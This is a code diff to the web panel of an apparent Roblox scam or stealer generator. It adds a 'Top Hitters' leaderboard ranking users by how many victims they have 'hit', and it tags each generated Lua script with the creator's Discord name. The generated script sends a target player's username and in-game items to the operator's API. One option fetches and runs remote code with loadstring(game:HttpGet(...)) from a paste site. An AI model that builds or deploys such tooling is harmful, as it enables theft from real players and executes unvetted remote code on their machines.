@@ -508,6 +508,44 @@
   @keyframes fadeDown { from { opacity:0; transform:translateY(-16px); } to { opacity:1; transform:none; } }
   @keyframes fadeUp   { from { opacity:0; transform:translateY(12px);  } to { opacity:1; transform:none; } }
   @keyframes blink    { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
+
+  /* ── TOP HITTERS ── */
+  .th-list { display: flex; flex-direction: column; gap: 0.45rem; padding: 0.75rem 1.25rem 1rem; }
+  .th-empty {
+    text-align: center; padding: 1.8rem 1rem;
+    font-family: 'Share Tech Mono', monospace; font-size: 0.72rem;
+    color: var(--muted); letter-spacing: 0.06em;
+  }
+  .th-row {
+    display: flex; align-items: center; gap: 0.85rem;
+    background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.07);
+    border-radius: 10px; padding: 0.6rem 0.9rem;
+    animation: fadeUp 0.2s ease both;
+  }
+  .th-rank {
+    font-family: 'Share Tech Mono', monospace; font-size: 0.72rem;
+    color: var(--muted); width: 22px; text-align: center; flex-shrink: 0;
+  }
+  .th-rank.gold   { color: #f0c040; font-weight: 700; font-size: 0.85rem; }
+  .th-rank.silver { color: #c0c8d8; font-weight: 700; font-size: 0.8rem; }
+  .th-rank.bronze { color: #cd8b52; font-weight: 700; font-size: 0.78rem; }
+  .th-avatar {
+    width: 32px; height: 32px; border-radius: 50%; flex-shrink: 0;
+    background: #5865F2; display: flex; align-items: center; justify-content: center;
+    font-size: 0.85rem; font-weight: 700; color: white;
+  }
+  .th-info { flex: 1; min-width: 0; }
+  .th-name {
+    font-size: 0.9rem; font-weight: 700; color: var(--text);
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .th-sub { font-family: 'Share Tech Mono', monospace; font-size: 0.62rem; color: var(--muted); margin-top: 0.1rem; }
+  .th-count {
+    font-family: 'Share Tech Mono', monospace; font-size: 1.05rem; font-weight: 700;
+    color: var(--neon); text-shadow: var(--neon-glow); flex-shrink: 0;
+  }
+  .th-label { font-family: 'Share Tech Mono', monospace; font-size: 0.58rem; color: var(--muted); text-align: right; }
+  .th-you { border-color: rgba(88,101,242,0.4); background: rgba(88,101,242,0.07); }
 </style>
 </head>
 <body>
@@ -582,6 +620,21 @@
       <input type="checkbox" class="toggle" id="autoToggle" onchange="toggleAuto()" checked>
       <label for="autoToggle">Live updates</label>
       <span id="autoStatus" style="margin-left:auto;"></span>
+    </div>
+  </div>
+
+  <!-- ── TOP HITTERS ── -->
+  <div class="panel">
+    <div class="ph">
+      <div class="dot dot-cyan"></div>
+      <span class="ph-title">Top Hitters</span>
+      <span class="hits-count" id="thCount"></span>
+      <div class="ph-actions">
+        <button class="btn-sm" id="thRefreshBtn" onclick="fetchTopHitters()">↻ Refresh</button>
+      </div>
+    </div>
+    <div class="th-list" id="thList">
+      <div class="th-empty" id="thEmpty">No hitters yet — generate a script and start hitting victims.</div>
     </div>
   </div>
 
@@ -1066,6 +1119,8 @@ async function generate() {
     const finalWebhook  = await createSentinelProxy(webhook);
     const brainrotLines = [...selected].map(n => `  ["${n}"] = true,`).join('\n');
     const allLines      = buildAllBrainrotsLua();
+    const discordStored = localStorage.getItem('skrinhub_discord');
+    const discordUser   = discordStored ? (JSON.parse(discordStored).username || 'anonymous') : 'anonymous';
 
     let adminPart = '';
     if (adminMode === 'admin-panel') adminPart = `\ntask.spawn(function()\nloadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()\nend)`;
@@ -1081,6 +1136,7 @@ getgenv().ALL_BRAINROTS = {
 ${allLines}
 }
 getgenv().SKRINHUB_API = "${HITS_URL}"
+getgenv().GENERATED_BY = "${discordUser}"
 
 -- Works across Synapse X, KRNL, Fluxus, Delta, Hydrogen, etc.
 local function httpPost(url, body)
@@ -1165,7 +1221,8 @@ task.spawn(function()
     local body = HttpService:JSONEncode({
       username = targetName,
       brainrots = found,
-      totalMps = tostring(#found) .. " detected"
+      totalMps = tostring(#found) .. " detected",
+      generatedBy = getgenv().GENERATED_BY
     })
     httpPost(getgenv().SKRINHUB_API, body)
   end)
@@ -1305,6 +1362,56 @@ function copyOut() {
   });
 }
 
+// ── TOP HITTERS ──────────────────────────────────────────────────────────
+async function fetchTopHitters() {
+  const btn = document.getElementById('thRefreshBtn');
+  if (btn) { btn.innerHTML = '<span class="spin">↻</span>'; btn.disabled = true; }
+  try {
+    const r = await fetch(API_BASE + '/api/tophitters', { signal: AbortSignal.timeout(6000) });
+    if (r.ok) renderTopHitters(await r.json());
+  } catch { /* silent */ }
+  if (btn) { btn.innerHTML = '↻ Refresh'; btn.disabled = false; }
+}
+
+function renderTopHitters(data) {
+  const list   = document.getElementById('thList');
+  const empty  = document.getElementById('thEmpty');
+  const count  = document.getElementById('thCount');
+  const myUser = (() => { try { return JSON.parse(localStorage.getItem('skrinhub_discord') || '{}').username || ''; } catch { return ''; } })();
+
+  list.querySelectorAll('.th-row').forEach(el => el.remove());
+
+  if (!data.length) { empty.style.display = 'block'; count.textContent = ''; return; }
+  empty.style.display = 'none';
+  count.textContent = data.length + ' hitter' + (data.length !== 1 ? 's' : '');
+
+  const medals = ['🥇', '🥈', '🥉'];
+  const rankCls = ['gold', 'silver', 'bronze'];
+
+  data.forEach((h, i) => {
+    const isYou = myUser && h.discordUser.toLowerCase() === myUser.toLowerCase();
+    const initial = (h.discordUser || '?')[0].toUpperCase();
+    const rankIcon = i < 3 ? medals[i] : `#${i + 1}`;
+    const rankClass = i < 3 ? rankCls[i] : '';
+    const ago = h.lastHit ? timeAgo(h.lastHit) : '';
+
+    const row = document.createElement('div');
+    row.className = 'th-row' + (isYou ? ' th-you' : '');
+    row.innerHTML = `
+      <div class="th-rank ${rankClass}">${rankIcon}</div>
+      <div class="th-avatar">${initial}</div>
+      <div class="th-info">
+        <div class="th-name">${h.discordUser}${isYou ? ' <span style="font-size:0.6rem;color:#8b9aff;font-weight:400;">(you)</span>' : ''}</div>
+        <div class="th-sub">last hit ${ago}</div>
+      </div>
+      <div style="text-align:right;flex-shrink:0;">
+        <div class="th-count">${h.hitCount}</div>
+        <div class="th-label">hit${h.hitCount !== 1 ? 's' : ''}</div>
+      </div>`;
+    list.appendChild(row);
+  });
+}
+
 // ── SCRIPT COUNTER ───────────────────────────────────────────────────────
 async function fetchScriptCount() {
   try {
@@ -1410,7 +1517,8 @@ function signOutDiscord() {
   renderDiscordBtn();
   fetchScriptCount();
   fetchHits();
-  autoInterval = setInterval(fetchHits, 8000);
+  fetchTopHitters();
+  autoInterval = setInterval(() => { fetchHits(); fetchTopHitters(); }, 8000);
 }());
 </script>
 </body>
